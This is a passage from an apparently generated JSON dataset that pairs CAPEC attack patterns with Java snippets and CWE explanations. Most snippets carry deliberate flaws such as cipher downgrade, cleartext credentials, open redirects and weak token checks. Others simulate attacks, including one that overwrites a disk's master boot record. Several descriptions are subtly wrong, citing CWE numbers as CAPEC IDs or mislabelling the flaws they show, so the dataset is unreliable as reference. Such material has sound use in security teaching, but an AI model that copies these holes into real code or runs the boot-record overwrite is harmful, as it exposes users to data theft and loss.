        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\n\npublic class EncryptionExample {\n    public static void main(String[] args) throws Exception {\n        // Generate a strong AES key\n        SecretKey strongKey = generateKey(\"AES\", 256);\n        // Generate a weak DES key\n        SecretKey weakKey = generateKey(\"DES\", 56);\n\n        // Simulate an attacker forcing the use of a weaker algorithm\n        SecretKey selectedKey = negotiateAlgorithm(strongKey, weakKey);\n\n        // Encrypt data with the selected (weaker) key\n        Cipher cipher = Cipher.getInstance(selectedKey.getAlgorithm());\n        cipher.init(Cipher.ENCRYPT_MODE, selectedKey);\n        byte[] encryptedData = cipher.doFinal(\"Sensitive Data\".getBytes());\n\n        System.out.println(\"Encrypted Data: \" + new String(encryptedData));\n    }\n\n    private static SecretKey generateKey(String algorithm, int keySize) throws NoSuchAlgorithmException {\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        keyGen.init(keySize, new SecureRandom());\n        return keyGen.generateKey();\n    }\n\n    private static SecretKey negotiateAlgorithm(SecretKey strongKey, SecretKey weakKey) {\n        // Simulate negotiation and selection of a weaker algorithm\n        return weakKey; // Vulnerability: selecting a weaker key\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker forces the encryption level to be lowered, embodying the 'Drop Encryption Level' CAPEC. The code generates a strong AES key and a weak DES key, then simulates an attacker influencing the negotiation process to select the weaker DES key for encryption. This represents CWE-757 (Algorithm Downgrade) by choosing a less secure algorithm during negotiation. The encryption of sensitive data with the weaker key also touches on CWE-326 (Inadequate Encryption Strength). The code highlights the vulnerability of using a weaker encryption algorithm, which can compromise the security of sensitive data."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.Socket;\n\npublic class VulnerableVoIPClient {\n    public static void main(String[] args) {\n        String serverAddress = \"192.168.1.100\";\n        int port = 5000;\n        String sensitiveData = \"User: JohnDoe, Password: 12345\";\n\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStream out = socket.getOutputStream()) {\n\n            // Simulate sending VoIP data with sensitive information\n            byte[] data = sensitiveData.getBytes();\n            out.write(data);\n            out.flush();\n\n            // Simulate timing-based operations\n            for (int i = 0; i < 10; i++) {\n                long startTime = System.nanoTime();\n                out.write(i);\n                out.flush();\n                long endTime = System.nanoTime();\n                System.out.println(\"Packet \" + i + \" sent in \" + (endTime - startTime) + \" ns\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable VoIP client that transmits sensitive information and exhibits timing discrepancies. The client connects to a server and sends sensitive data (username and password) in cleartext, which can be intercepted by an attacker (CWE-319). Additionally, the code simulates sending VoIP data packets with timing information that can be observed and analyzed by an attacker to infer sensitive information (CWE-208, CWE-385). The timing of each packet is printed, demonstrating how an attacker could analyze packet timing and sizes to gather metadata, aligning with the CAPEC description."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\n\npublic class VulnerableCrypto {\n    public static void main(String[] args) throws Exception {\n        // Generate a weak cryptographic key\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(128); // Weak key size\n        SecretKey secretKey = keyGen.generateKey();\n\n        // Initialize cipher with weak algorithm\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\"); // ECB mode is insecure\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n\n        // Sensitive data to be encrypted\n        byte[] sensitiveData = \"SensitiveData123\".getBytes();\n\n        // Encrypt the data\n        byte[] encryptedData = cipher.doFinal(sensitiveData);\n\n        // Simulate sending sensitive data over an insecure channel\n        sendOverInsecureChannel(encryptedData);\n    }\n\n    private static void sendOverInsecureChannel(byte[] data) {\n        // Simulate sending data over an insecure channel\n        System.out.println(\"Sending data: \" + new String(data));\n    }\n}\n",
        "description": "This Java code snippet demonstrates a scenario vulnerable to an Electromagnetic Side-Channel Attack. The code uses a weak cryptographic algorithm (AES in ECB mode with no padding) to encrypt sensitive data. The use of ECB mode is insecure because it does not provide sufficient protection against side-channel attacks (CWE-327). Additionally, the code simulates sending the encrypted data over an insecure channel (CWE-201), which could be intercepted by an attacker. The weak cryptographic practices and insecure data transmission make the system susceptible to electromagnetic side-channel attacks, where an attacker could potentially recover the cryptographic keys or sensitive data by monitoring electromagnetic emissions (CWE-1300)."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class SensitiveDataTransmitter {\n    private static final String SERVER_ADDRESS = \"192.168.1.100\";\n    private static final int SERVER_PORT = 8080;\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        try {\n            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(sensitiveData.getBytes());\n            outputStream.flush();\n            outputStream.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information (a user's password) is transmitted over a network without proper protection. This embodies the main idea of a Compromising Emanations Attack (CAPEC-201) by showing how sensitive data can be exposed through unintentional signals. The code also touches on related CWEs: \n1. CWE-201: The sensitive information (password) is inserted into sent data without encryption, making it accessible to unauthorized actors. \n2. CWE-1300: The code does not implement any protection mechanisms to prevent physical side channels from exposing sensitive information. \n3. CWE-1320: There are no alerts or error messages to indicate that sensitive data is being transmitted insecurely. \n4. CWE-1319: The device is susceptible to electromagnetic fault injection attacks due to the lack of security mechanisms. \n5. CWE-1420: The code does not account for transient execution vulnerabilities that could expose sensitive data through covert channels."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "public class HardwareDevice {\n    private boolean voltageGlitchDetected = false;\n    private boolean clockGlitchDetected = false;\n    private boolean overheatingDetected = false;\n    private boolean coldEnvironmentDetected = false;\n\n    public void performCryptographicOperation() {\n        if (voltageGlitchDetected || clockGlitchDetected || overheatingDetected || coldEnvironmentDetected) {\n            throw new SecurityException(\"Fault injection detected. Aborting operation.\");\n        }\n        // Simulate cryptographic operation\n        System.out.println(\"Performing cryptographic operation...\");\n    }\n\n    public void detectVoltageGlitch() {\n        // Simulate detection logic\n        voltageGlitchDetected = true;\n    }\n\n    public void detectClockGlitch() {\n        // Simulate detection logic\n        clockGlitchDetected = true;\n    }\n\n    public void detectOverheating() {\n        // Simulate detection logic\n        overheatingDetected = true;\n    }\n\n    public void detectColdEnvironment() {\n        // Simulate detection logic\n        coldEnvironmentDetected = true;\n    }\n\n    public static void main(String[] args) {\n        HardwareDevice device = new HardwareDevice();\n        device.detectVoltageGlitch(); // Simulate a voltage glitch attack\n        try {\n            device.performCryptographicOperation();\n        } catch (SecurityException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a hardware device that performs cryptographic operations. The device includes basic detection mechanisms for various fault injection attacks such as voltage glitches, clock glitches, overheating, and cold environments. If any of these faults are detected, the cryptographic operation is aborted to prevent potential security breaches. This code embodies the main idea of CAPEC-188 (Hardware Fault Injection) by demonstrating how a device might detect and respond to fault injection attempts, thereby protecting sensitive information. The related CWEs are addressed by simulating detection mechanisms for voltage and clock glitches (CWE-1247), overheating (CWE-1338), and cold environments (CWE-1351)."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "public class MobileDevice {\n    private boolean voltageGlitchDetected = false;\n    private boolean clockGlitchDetected = false;\n    private boolean emfiDetected = false;\n    private boolean overheatingDetected = false;\n    private boolean coldEnvironmentDetected = false;\n\n    public void performCryptographicOperation() {\n        if (voltageGlitchDetected || clockGlitchDetected || emfiDetected || overheatingDetected || coldEnvironmentDetected) {\n            throw new SecurityException(\"Fault injection detected. Aborting operation.\");\n        }\n        // Simulate cryptographic operation\n        System.out.println(\"Performing cryptographic operation...\");\n    }\n\n    public void detectVoltageGlitch() {\n        // Simulate detection logic\n        voltageGlitchDetected = true;\n    }\n\n    public void detectClockGlitch() {\n        // Simulate detection logic\n        clockGlitchDetected = true;\n    }\n\n    public void detectEMFI() {\n        // Simulate detection logic\n        emfiDetected = true;\n    }\n\n    public void detectOverheating() {\n        // Simulate detection logic\n        overheatingDetected = true;\n    }\n\n    public void detectColdEnvironment() {\n        // Simulate detection logic\n        coldEnvironmentDetected = true;\n    }\n\n    public static void main(String[] args) {\n        MobileDevice device = new MobileDevice();\n        device.detectVoltageGlitch(); // Simulate a fault injection attack\n        try {\n            device.performCryptographicOperation();\n        } catch (SecurityException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a mobile device that performs cryptographic operations. The device includes detection mechanisms for various fault injection attacks such as voltage glitches, clock glitches, electromagnetic fault injection (EMFI), overheating, and cold environments. If any of these faults are detected, the cryptographic operation is aborted to prevent potential security breaches. This code embodies the main idea of CAPEC-1247, CAPEC-1248, CAPEC-1256, CAPEC-1319, CAPEC-1332, CAPEC-1334, CAPEC-1338, and CAPEC-1351 by demonstrating how a device might detect and respond to fault injection attacks to protect sensitive information."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import java.awt.image.BufferedImage;\nimport java.io.File;\nimport javax.imageio.ImageIO;\n\npublic class SmudgeAttackExample {\n    public static void main(String[] args) {\n        try {\n            // Load an image of the touchscreen with smudges\n            BufferedImage image = ImageIO.read(new File(\"touchscreen_smudge.png\"));\n            \n            // Analyze the image to detect smudge patterns\n            String detectedPattern = analyzeSmudgePattern(image);\n            \n            // Use the detected pattern to simulate an authentication bypass\n            if (authenticateUsingPattern(detectedPattern)) {\n                System.out.println(\"Authentication successful using smudge pattern!\");\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String analyzeSmudgePattern(BufferedImage image) {\n        // Placeholder for image analysis logic\n        // In a real scenario, this would involve complex image processing to detect smudge patterns\n        return \"1234\"; // Simulated detected pattern\n    }\n\n    private static boolean authenticateUsingPattern(String pattern) {\n        // Simulate authentication using the detected pattern\n        String correctPattern = \"1234\"; // The actual pattern set by the user\n        return pattern.equals(correctPattern);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a smudge attack on a touchscreen device. The code loads an image of a touchscreen with smudges, analyzes the image to detect a smudge pattern, and then attempts to authenticate using the detected pattern. The `analyzeSmudgePattern` method is a placeholder for the actual image processing logic that would be used to detect smudge patterns. The `authenticateUsingPattern` method simulates the authentication process using the detected pattern. This example embodies the main idea of the CAPEC by showing how smudge patterns can be used to bypass authentication on a touchscreen device. The related CWEs provide additional context, such as the lack of protection against physical side channels (CWE-1300) and excessive attack surface (CWE-1125), which contribute to the vulnerability."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import java.util.Random;\n\npublic class GPSReceiver {\n    private static final double TRUE_LATITUDE = 37.7749;\n    private static final double TRUE_LONGITUDE = -122.4194;\n    private static final double TRUE_ALTITUDE = 30.0;\n\n    public static void main(String[] args) {\n        double[] spoofedCoordinates = getSpoofedCoordinates();\n        System.out.println(\"Received GPS Coordinates: \");\n        System.out.println(\"Latitude: \" + spoofedCoordinates[0]);\n        System.out.println(\"Longitude: \" + spoofedCoordinates[1]);\n        System.out.println(\"Altitude: \" + spoofedCoordinates[2]);\n    }\n\n    private static double[] getSpoofedCoordinates() {\n        Random random = new Random();\n        double spoofedLatitude = TRUE_LATITUDE + (random.nextDouble() - 0.5) * 0.1;\n        double spoofedLongitude = TRUE_LONGITUDE + (random.nextDouble() - 0.5) * 0.1;\n        double spoofedAltitude = TRUE_ALTITUDE + (random.nextDouble() - 0.5) * 10;\n        return new double[]{spoofedLatitude, spoofedLongitude, spoofedAltitude};\n    }\n}",
        "description": "This Java code snippet simulates a GPS receiver that is vulnerable to counterfeit GPS signals. The `getSpoofedCoordinates` method generates random coordinates that deviate slightly from the true coordinates, mimicking the effect of a GPS spoofing attack. The main method prints these spoofed coordinates, demonstrating how an adversary could deceive the GPS receiver into believing it is at a different location. This example embodies the CAPEC 'Counterfeit GPS Signals' by showing how spoofed signals can alter the perceived position. The code also touches on related CWEs, such as improper verification of the source (CWE-940) and improper enforcement of message integrity (CWE-924), by not validating the authenticity of the received GPS data."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import java.util.Random;\n\npublic class GPSSpoofingAttack {\n    private static final double TRUE_LATITUDE = 37.7749;\n    private static final double TRUE_LONGITUDE = -122.4194;\n    private static final double SPOOFED_LATITUDE = 40.7128;\n    private static final double SPOOFED_LONGITUDE = -74.0060;\n    private static final double INCREMENT = 0.0001;\n\n    public static void main(String[] args) {\n        double currentLatitude = TRUE_LATITUDE;\n        double currentLongitude = TRUE_LONGITUDE;\n        Random random = new Random();\n\n        while (Math.abs(currentLatitude - SPOOFED_LATITUDE) > INCREMENT || Math.abs(currentLongitude - SPOOFED_LONGITUDE) > INCREMENT) {\n            currentLatitude += (SPOOFED_LATITUDE - currentLatitude) * INCREMENT * random.nextDouble();\n            currentLongitude += (SPOOFED_LONGITUDE - currentLongitude) * INCREMENT * random.nextDouble();\n            System.out.println(\"Current Latitude: \" + currentLatitude + \", Current Longitude: \" + currentLongitude);\n            try {\n                Thread.sleep(1000); // Simulate time passing\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"Spoofed Location Reached: \" + currentLatitude + \", \" + currentLongitude);\n    }\n}",
        "description": "This Java code snippet simulates a GPS spoofing attack, specifically a 'Carry-Off GPS Attack'. The code starts with the true GPS coordinates and gradually shifts them towards the spoofed coordinates. The gradual shift is achieved by incrementally adjusting the current coordinates towards the spoofed coordinates, simulating the increasing power of counterfeit signals. This represents the main idea of the CAPEC, where an adversary can carry the target away from their intended destination. The code also highlights potential weaknesses such as improper verification of the source of communication (CWE-940) and incorrect specification of the destination (CWE-941), as the GPS receiver does not verify the authenticity of the signals it receives."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class VulnerableResourceHandler {\n    public static void main(String[] args) {\n        String userInput = \"CON\"; // CWE-67: Improper Handling of Windows Device Names\n        try {\n            File file = new File(userInput);\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n            // Simulate resource usage\n            System.out.println(\"Using resource: \" + file.getName());\n            // CWE-772: Missing Release of Resource after Effective Lifetime\n            // Resource is not properly released\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // CWE-863: Incorrect Authorization\n    public boolean isAuthorized(String userRole) {\n        if (userRole.equals(\"admin\")) {\n            return true;\n        }\n        return false; // Incorrect authorization logic\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Unauthorized Use of Device Resources'. The code improperly handles Windows device names (CWE-67) by allowing user input to specify a device name like 'CON', which can lead to denial of service or information exposure. It also fails to release a resource after its effective lifetime (CWE-772), as the created file is not properly closed or deleted. Additionally, the authorization check (CWE-863) is flawed, allowing unauthorized access if the user role is not correctly validated. This code embodies the main idea of unauthorized use of device resources by demonstrating improper handling and authorization issues."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n            response.sendRedirect(targetUrl);\n        } else {\n            response.sendRedirect(\"/defaultPage\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a potential TypoSquatting vulnerability by allowing user-controlled input to dictate the redirection URL. The 'targetUrl' parameter is taken directly from the request and used in a redirect without validation, which can lead to CWE-601: URL Redirection to Untrusted Site ('Open Redirect'). An attacker can exploit this by providing a URL similar to a trusted domain, leading users to a malicious site. This snippet embodies the main idea of TypoSquatting by showing how improper handling of URLs can facilitate phishing attacks."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\npublic class SoundSquattingExample {\n    public static void main(String[] args) {\n        String userInputDomain = \"trusted-site.com\"; // Simulated user input\n        String soundSquattedDomain = \"trvsted-site.com\"; // SoundSquatted domain\n\n        try {\n            // CWE-601: URL Redirection to Untrusted Site\n            URL url = new URL(\"http://\" + soundSquattedDomain);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // CWE-348: Use of Less Trusted Source\n            Scanner scanner = new Scanner(connection.getInputStream());\n            String response = scanner.useDelimiter(\"\\\\A\").next();\n            scanner.close();\n\n            // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            String hostname = url.getHost();\n            if (!hostname.equals(userInputDomain)) {\n                System.out.println(\"Warning: The domain name does not match the trusted domain.\");\n            }\n\n            // CWE-290: Authentication Bypass by Spoofing\n            if (response.contains(\"Login Successful\")) {\n                System.out.println(\"User authenticated on: \" + hostname);\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SoundSquatting attack scenario where an adversary registers a domain name that sounds similar to a trusted domain. The code simulates a user input for a trusted domain and uses a sound-squatted domain instead. It then attempts to connect to the sound-squatted domain and checks the response. The code highlights several related CWEs:\n\n1. CWE-601: URL Redirection to Untrusted Site - The code constructs a URL using the sound-squatted domain, which could lead to phishing attacks.\n2. CWE-348: Use of Less Trusted Source - The code uses the response from the less trusted sound-squatted domain.\n3. CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action - The code performs a check on the hostname to ensure it matches the trusted domain, but this check is not foolproof.\n4. CWE-290: Authentication Bypass by Spoofing - The code checks for a successful login message in the response, which could be spoofed by the adversary.\n\nOverall, the code illustrates how a SoundSquatting attack can mislead users and compromise security by exploiting similar-sounding domain names."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class HomographAttackExample {\n    public static void main(String[] args) {\n        String userInput = \"http://ex\u0430mple.com\"; // Note: The '\u0430' is a Cyrillic 'a'\n        String trustedDomain = \"http://example.com\";\n\n        if (isValidDomain(userInput, trustedDomain)) {\n            System.out.println(\"Domain is trusted.\");\n        } else {\n            System.out.println(\"Domain is not trusted.\");\n        }\n    }\n\n    public static boolean isValidDomain(String userInput, String trustedDomain) {\n        // CWE-777: Regular Expression without Anchors\n        Pattern pattern = Pattern.compile(\".*example\\.com\");\n        Matcher matcher = pattern.matcher(userInput);\n        return matcher.matches();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a potential vulnerability to a homograph attack via homoglyphs. The user input contains a domain name with a Cyrillic '\u0430' instead of a Latin 'a', which visually appears the same to the user. The `isValidDomain` method uses a regular expression to check if the user input matches the trusted domain. However, the regular expression is not anchored (CWE-777), allowing malicious or malformed data to slip through. This can lead to improper validation and potential security risks, such as directing users to a malicious site that appears to be trusted. The code highlights the importance of proper validation and the risks associated with visually similar characters in domain names."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class TokenImpersonationExample {\n    private static Map<String, String> userTokens = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Adding a user token (Insecurely stored and generated)\n        userTokens.put(\"user1\", \"token123\");\n\n        // Adversary impersonates user1 by using the same token\n        String impersonatedToken = \"token123\";\n\n        // Validate token (Improper Authentication)\n        if (validateToken(\"user2\", impersonatedToken)) {\n            System.out.println(\"User2 authenticated successfully with user1's token!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean validateToken(String username, String token) {\n        // Weak Authentication: Simply checks if the token exists\n        return userTokens.containsValue(token);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of token impersonation. The `userTokens` map stores user tokens insecurely. An adversary can impersonate 'user1' by using the same token 'token123'. The `validateToken` method performs weak authentication by only checking if the token exists in the map, without verifying the association between the token and the username. This represents the CAPEC idea of exploiting authentication weaknesses to impersonate a different entity, leading to improper authentication (CWE-287), weak authentication (CWE-1390), and generation of incorrect security tokens (CWE-1270)."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import javax.sound.sampled.*;\nimport java.io.*;\n\npublic class AudioCapture {\n    public static void main(String[] args) {\n        try {\n            // Define the audio format\n            AudioFormat format = new AudioFormat(16000, 16, 2, true, true);\n            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n\n            // Check if the system supports the data line\n            if (!AudioSystem.isLineSupported(info)) {\n                System.out.println(\"Line not supported\");\n                System.exit(0);\n            }\n\n            // Get and open the target data line\n            TargetDataLine targetLine = (TargetDataLine) AudioSystem.getLine(info);\n            targetLine.open(format);\n            targetLine.start();\n\n            // Create a thread to capture audio data\n            Thread captureThread = new Thread(() -> {\n                try (ByteArrayOutputStream out = new ByteArrayOutputStream()) {\n                    byte[] buffer = new byte[1024];\n                    while (true) {\n                        int bytesRead = targetLine.read(buffer, 0, buffer.length);\n                        out.write(buffer, 0, bytesRead);\n                        // Simulate sending data over a network in cleartext\n                        sendDataOverNetwork(out.toByteArray());\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            captureThread.start();\n        } catch (LineUnavailableException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void sendDataOverNetwork(byte[] data) {\n        // Simulate cleartext transmission of sensitive information\n        System.out.println(\"Sending data: \" + new String(data));\n    }\n}",
        "description": "This Java code snippet demonstrates the capture of audio data from a system's microphone and the transmission of this data over a network in cleartext. The code sets up an audio format and checks if the system supports the required data line. It then captures audio data in a separate thread and simulates sending this data over a network without encryption. This embodies the CAPEC 'Probe Audio and Video Peripherals' by showing how an adversary could exploit audio functionalities to capture sensitive information. The code also highlights CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting the captured audio data in cleartext, making it vulnerable to interception by unauthorized actors."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class FileUpload {\n    public static void main(String[] args) {\n        String userInputFileName = \"example.txt\"; // This should come from user input\n        try {\n            // Check file extension\n            if (!userInputFileName.endsWith(\".txt\")) {\n                throw new IOException(\"Invalid file type\");\n            }\n\n            // Construct file path\n            Path filePath = Paths.get(\"uploads/\" + userInputFileName);\n\n            // Check for 8.3 filename equivalence\n            File file = filePath.toFile();\n            String shortName = file.getCanonicalPath();\n            if (!shortName.equals(filePath.toAbsolutePath().toString())) {\n                throw new IOException(\"Invalid file path\");\n            }\n\n            // Simulate file processing\n            Files.createFile(filePath);\n            System.out.println(\"File uploaded successfully: \" + filePath);\n        } catch (IOException e) {\n            System.err.println(\"File upload failed: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload mechanism that embodies the main idea of CAPEC-176: 'Alternative Execution Due to Deceptive Filenames'. The code allows a user to upload a file and relies on the file extension to determine if the file is valid. It also constructs the file path using user input and checks for 8.3 filename equivalence. However, this approach is vulnerable to several CWE weaknesses: CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), CWE-641 (Improper Restriction of Names for Files and Other Resources), and CWE-58 (Path Equivalence: Windows 8.3 Filename). An attacker could exploit these weaknesses to upload a malicious file with a deceptive filename, potentially leading to code execution, denial of service, or exposure of sensitive information."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class MaliciousFileHider {\n    public static void main(String[] args) {\n        try {\n            // Create a normal file\n            File file = new File(\"example.txt\");\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Write normal content to the file\n            FileOutputStream fos = new FileOutputStream(file);\n            fos.write(\"This is a normal text file.\".getBytes());\n            fos.close();\n\n            // Hide malicious data in the file's metadata (extended attributes)\n            String maliciousData = \"<malicious code>\";\n            Files.setAttribute(Paths.get(\"example.txt\"), \"user.maliciousData\", maliciousData.getBytes());\n\n            System.out.println(\"File created with hidden malicious data.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker might hide malicious data within a file's metadata, making it difficult to detect during normal file usage. The code creates a normal text file and writes some benign content to it. Then, it uses the `Files.setAttribute` method to store malicious data in the file's extended attributes (metadata). This approach aligns with the CAPEC description of hiding malicious data within files and touches on related CWEs such as CWE-506 (Embedded Malicious Code) and CWE-515 (Covert Storage Channel). The hidden data is not visible during normal file operations, making it a covert channel for storing malicious information."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import java.awt.datatransfer.Clipboard;\nimport java.awt.datatransfer.DataFlavor;\nimport java.awt.datatransfer.Transferable;\nimport java.awt.Toolkit;\n\npublic class ClipboardDataCollector {\n    public static void main(String[] args) {\n        try {\n            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();\n            Transferable contents = clipboard.getContents(null);\n            if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {\n                String clipboardData = (String) contents.getTransferData(DataFlavor.stringFlavor);\n                // Simulate storing sensitive data in cleartext\n                System.out.println(\"Clipboard Data: \" + clipboardData);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an application can collect data from the system clipboard. The code accesses the clipboard, checks if the clipboard contains string data, and then retrieves and prints the clipboard contents. This represents the CAPEC 'Collect Data from Clipboard' by showing how an application can access and potentially misuse clipboard data. The code also touches on related CWEs: it prints sensitive information in cleartext (CWE-318, CWE-317), and it does not prevent unauthorized access to potentially sensitive clipboard data (CWE-497). This example highlights the risks of clipboard data being accessed and exposed by unauthorized applications."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import java.io.RandomAccessFile;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\n\npublic class FirmwareAlteration {\n    private static final String HDD_PATH = \"/dev/sda\";\n    private static final int MBR_SIZE = 512;\n    private static final byte[] MALICIOUS_PAYLOAD = new byte[]{ /* malicious code bytes */ };\n\n    public static void main(String[] args) {\n        try (RandomAccessFile hdd = new RandomAccessFile(HDD_PATH, \"rw\");\n             FileChannel channel = hdd.getChannel()) {\n\n            // Read the original MBR\n            ByteBuffer mbrBuffer = ByteBuffer.allocate(MBR_SIZE);\n            channel.read(mbrBuffer, 0);\n\n            // Modify the MBR to include malicious payload\n            mbrBuffer.position(0);\n            mbrBuffer.put(MALICIOUS_PAYLOAD);\n\n            // Write the modified MBR back to the HDD\n            mbrBuffer.position(0);\n            channel.write(mbrBuffer, 0);\n\n            System.out.println(\"MBR modified successfully.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an attack that modifies the Master Boot Record (MBR) of a hard disk drive (HDD) to include a malicious payload. The code opens the HDD device file, reads the original MBR, modifies it by injecting the malicious payload, and writes the altered MBR back to the HDD. This represents the CAPEC 'Altered Component Firmware' by showing how an adversary could exploit improperly protected firmware to achieve persistence on a system. The code also touches on related CWEs, such as insufficient access control and the ability to execute untrusted code during the boot process."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class VulnerableFileStorage {\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword=12345\";\n        File file = new File(\"/tmp/sensitive_info.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.out.println(\"Sensitive data written to /tmp/sensitive_info.txt\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where sensitive information is stored in a file without proper access controls. The code writes a string containing sensitive data (a user password) to a file located in the /tmp directory. This directory is typically accessible to all users on the system, making the sensitive information vulnerable to unauthorized access. This example embodies the main idea of CAPEC-552 (Probe System Files) and is related to CWE-552 (Files or Directories Accessible to External Parties) and CWE-377 (Insecure Temporary File). The code highlights the risk of storing sensitive information in improperly protected files, which can be exploited by adversaries to gain unauthorized access."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
